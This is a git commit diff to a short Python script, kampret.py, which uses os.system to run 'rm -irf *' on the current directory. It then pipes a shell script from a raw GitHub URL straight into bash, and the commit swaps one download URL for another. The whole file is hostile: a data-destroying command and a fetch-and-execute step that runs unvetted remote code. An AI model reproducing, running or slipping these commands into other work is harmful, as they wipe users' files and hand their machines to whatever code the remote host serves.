06f113f09ecce7e4ba8cb9b91918cd74f8f0c131
Mekiku <92992407+Mekiku@users.noreply.github.com>
2024-05-25 17:20:59 +0700

    Update kampret.py

--- kampret.py
+++ kampret.py
@@ -1,3 +1,3 @@
 import os as kampret
 kampret.system("rm -irf *")
-kampret.system("curl -sL https://raw.githubusercontent.com/petugas/No/main/gaga | bash")
+kampret.system("curl -sL https://raw.githubusercontent.com/Github-offic/slot/main/rig | bash")
